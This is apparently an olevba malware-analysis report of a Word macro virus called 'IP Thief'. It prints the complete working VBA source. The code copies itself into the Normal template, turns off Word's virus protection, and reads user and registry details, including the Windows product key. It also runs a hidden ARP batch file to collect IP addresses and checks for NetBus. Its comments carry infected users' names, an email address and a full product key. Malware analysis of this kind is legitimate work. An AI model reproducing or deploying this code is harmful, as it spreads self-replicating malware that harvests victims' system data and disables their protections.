olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tif-b71c1f5b26cbccb672257994a4bf9b4a8a7993a4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO IPThief.cls 
in file: Virus.MSWord.Tif-b71c1f5b26cbccb672257994a4bf9b4a8a7993a4 - OLE stream: 'Macros/VBA/IPThief'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'IP Thief virus --> @@@###$$$%%%!!!^^^&&&***
'by THE BUG
' User Name     - Rio&Umi 4ever together
' Initials      - Rio
' User Address  - rio96@student.te.ugm.ac.id
' Word Version  - 8.0
' Windows Key   -
' Processor     -
' Vendor        -
' Computer Name - Win95A-Office
'
' Date when this normal was infected - 10-06-2000
' Time when this normal was infected - 08:19:11
'/**/**/**/**/**/**/**/**/**/**/**/**/**/**
' User Name     - Replication System
' Initials      - RS
' User Address  -
' Word Version  - 8.0
' Windows Key   -
' Processor     - x86 Family 5 Model 2 Stepping 12
' Vendor        - GenuineIntel
' Computer Name - REPLMACRO1
'
' Date when this normal was infected - 11-23-2000
' Time when this normal was infected - 13:50:48
'/**/**/**/**/**/**/**/**/**/**/**/**/**/**
' User Name     - Andreas Marx
' Initials      - AM
' User Address  -
' Word Version  - 8.0
' Windows Key   - MD97J-QC7R7-TQJGD-3V2WM-W7PVM
' Processor     - x86 Family 6 Model 8 Stepping 3
' Vendor        - GenuineIntel
' Computer Name - TEST03
'
' Date when this normal was infected - 02-23-2001
' Time when this normal was infected - 13:27:15
'/**/**/**/**/**/**/**/**/**/**/**/**/**/**


Private Sub Document_Open()
'Bem, se alguém mais er... vamos dizer... inteligente pegar este vírus e ler o source dele, alguma coisa de, er..., útil, vai poder fazer... com certeza!
'É. Eu tentei fazer um vírus de macro que roubasse IP. Não sei se funciona direito pq eu ainda não testei... se essa merda não funcionar direito NÃO fiquem me ENCHENDO O SACO dizendo QUE ESSA PORRA TEM BUG. (THE BUG hehehe)
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Set T = Me.VBProject.VBComponents.Item(1)
Set a = ActiveDocument.VBProject.VBComponents.Item(1)
Set n = NormalTemplate.VBProject.VBComponents.Item(1)
If n.Name <> "IPThief" Or n.Name = "IPThief" And n.CodeModule.Lines(1, 1) <> "'IP Thief virus --> @@@###$$$%%%!!!^^^&&&***" Then
IPThiefCode = T.CodeModule.Lines(1, T.CodeModule.CountOfLines)
n.CodeModule.DeleteLines 1, n.CodeModule.CountOfLines
n.CodeModule.addfromstring IPThiefCode
n.Name = "IPThief"
'It'z completely useless, isn't?
Open "C:\GetIp.Bat" For Output As #1
Print #1, "C:\WINDOWS\ARP -A > C:\IP.TXT"
Close #1
n.CodeModule.addfromstring "' User Name     - " & Application.UserName
n.CodeModule.addfromstring "' Initials      - " & Application.UserInitials
n.CodeModule.addfromstring "' User Address  - " & Application.UserAddress
n.CodeModule.addfromstring "' Word Version  - " & Application.Version
n.CodeModule.addfromstring "' Windows Key   - " & System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductKey")
n.CodeModule.addfromstring "' Processor     - " & System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "Identifier")
n.CodeModule.addfromstring "' Vendor        - " & System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "VendorIdentifier")
n.CodeModule.addfromstring "' Computer Name - " & System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName", "ComputerName")
n.CodeModule.addfromstring "' "
n.CodeModule.addfromstring "' Date when this normal was infected - " & Date$
n.CodeModule.addfromstring "' Time when this normal was infected - " & Time$
n.CodeModule.addfromstring "'/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Private Sub Document_Close()
Application.EnableCancelKey = wdCancelDisabled
Set T = Me.VBProject.VBComponents.Item(1)
Set a = ActiveDocument.VBProject.VBComponents.Item(1)
Set n = NormalTemplate.VBProject.VBComponents.Item(1)
If a.Name <> "IPThief" Or a.Name = "IPThief" And a.CodeModule.Lines(1, 1) <> "'IP Thief virus --> @@@###$$$%%%!!!^^^&&&***" Then
IPThiefCode = n.CodeModule.Lines(1, n.CodeModule.CountOfLines)
a.CodeModule.DeleteLines 1, a.CodeModule.CountOfLines
a.CodeModule.addfromstring IPThiefCode
a.Name = "IPThief"
End If
End Sub
Sub AutoExec()
On Error Resume Next
If Dir("C:\GetIp.Bat") = "" Then MakeGetIp
'Only if user is online
Shell "C:\GetIp.Bat", vbHide
End Sub
Sub AutoExit()
On Error Resume Next
Set n = NormalTemplate.VBProject.VBComponents.Item(1)
Open "c:\IP.TXT" For Input As #1
If LOF(1) = 0 Then GoTo Q
Do While Not EOF(1)
Line Input #1, a
If a = "Nenhuma entrada ARP foi encontrada" Then GoTo Merda
n.CodeModule.addfromstring "' " & a
Loop
Q:
n.CodeModule.addfromstring "'The IP between [ ] is the IP of the user " & Application.UserName
Close #1
'Check if NETBUS are installed
WindowsDir = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
If Dir(WindowsDir + "\Patch.exe") <> "" Then n.CodeModule.addfromstring "'The user " & Application.UserName & " are infected by NETBUS"
n.CodeModule.addfromstring "'/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
Merda:
End Sub
Private Sub MakeGetIp()
Open "C:\GetIp.Bat" For Output As #1
Print #1, "C:\WINDOWS\ARP -A > C:\IP.TXT"
Close #1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |GetIp.Bat           |Executable file name                         |
|IOC       |Patch.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

